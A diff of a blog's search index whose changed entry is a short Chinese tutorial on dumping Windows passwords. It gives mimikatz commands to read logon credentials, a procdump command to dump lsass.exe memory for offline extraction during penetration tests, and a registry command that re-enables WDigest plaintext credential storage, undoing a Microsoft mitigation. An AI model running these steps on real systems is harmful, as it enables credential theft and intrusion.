@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[把Windows密码dump下来]]></title>
     <url>%2F2019%2F10%2F11%2F01_dump_win_pwd%2F</url>
-    <content type="text"><![CDATA[00 前言把Windows密码dump下来, 使用以下工具:mimikatzpwdump7 01 使用方法win7/10好说, 直接dump或者使用mimikatz即可 参考链接 02 本地dump运行mimikatz, 管理员权限, 执行以下命令即可 12privilege::debugsekurlsa::logonpasswords 03 离线dump渗透的时候用procdump, 如果有机会弄到lsass.exe, 右键创建存储文件即可使用procdump命令:xxx\procdump.exe -accepteula -ma lsass.exe xxx\lsass.dmp然后把dmp文件下载下来本地跑mimikatz即可 04 失效解决方法微软打了补丁kb2871997，通过禁用Wdigest Auth来强制系统内存不保存明文口令参考链接 使用命令修改注册表:reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 然后注销或者重启即可 以下为正常注册表, 没有UseLogonCredential项 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
+    <content type="text"><![CDATA[00 前言把Windows密码dump下来, 使用以下工具:mimikatzpwdump7 01 使用方法win7/10好说, 直接dump或者使用mimikatz即可 参考链接 02 本地dump运行mimikatz, 管理员权限, 执行以下命令即可 12privilege::debugsekurlsa::logonpasswords 03 离线dump渗透的时候用procdump, 如果有机会弄到lsass.exe, 右键创建存储文件即可使用procdump命令:xxx\procdump.exe -accepteula -ma lsass.exe xxx\lsass.dmp然后把dmp文件下载下来本地跑mimikatz即可 04 失效解决方法微软打了补丁kb2871997，通过禁用Wdigest Auth来强制系统内存不保存明文口令参考链接 使用命令修改注册表:reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 然后注销或者重启即可 以下为正常注册表, 没有UseLogonCredential项 05 下载地址ProcDumpmimikatz还有一个pwdump7, 下载地址不是官方, 就不给出来了 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
       <categories>
         <category>Sec</category>
         <category>Windows</category>
@@ -132,8 +132,8 @@
         <category>Chrome</category>
       </categories>
       <tags>
-        <tag>Network</tag>
         <tag>Proxy</tag>
+        <tag>Network</tag>
       </tags>
   </entry>
   <entry>
